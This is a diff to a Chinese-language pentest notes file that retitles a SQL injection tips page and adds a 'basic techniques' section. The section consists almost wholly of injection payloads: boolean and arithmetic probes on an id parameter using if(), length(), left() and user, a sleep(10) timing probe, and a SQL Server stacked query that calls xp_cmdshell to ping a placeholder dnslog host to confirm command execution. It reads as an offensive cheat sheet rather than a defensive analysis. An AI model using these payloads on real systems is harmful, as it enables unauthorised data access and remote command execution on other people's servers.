@@ -1,5 +1,20 @@
-SQL注入小技巧
+挖掘技巧
 ================================
+
+基本手法
+--------------------------------
++ 除法可用： ``?id=2/1``
++ 找到可执行的函数或方法
+    - ``?id=4/if(2=2,2,1)`` 即 ``?id=2``
+    - ``?id=4/if(length(user)=1,1,0)`` ：length方法可用
+    - ``?id=4/if(left('123',1)=1,1,0)`` :left方法可用
+    - ``?id=4/if(left(user,1)='a',1,1)`` :证明user可以用
+    - ``?id=1+and+sleep(10)`` :证明sleep函数可用
++ 联合注入
+	- ``DECLARE @command VARCHAR(8000); SELECT @command=(SELECT TOP 1 name FROM sysobjects); SELECT @command;`` 
+	- SQL Server: ``DECLARE @command VARCHAR(8000); SELECT @command='ping xx.dnslog.com'; EXEC Master.dbo.xp_cmdshell @command;select 1 as 'STEP'``
++ 其它
+    - 一般java的网站sql注入会多一点
 
 宽字节注入
 --------------------------------
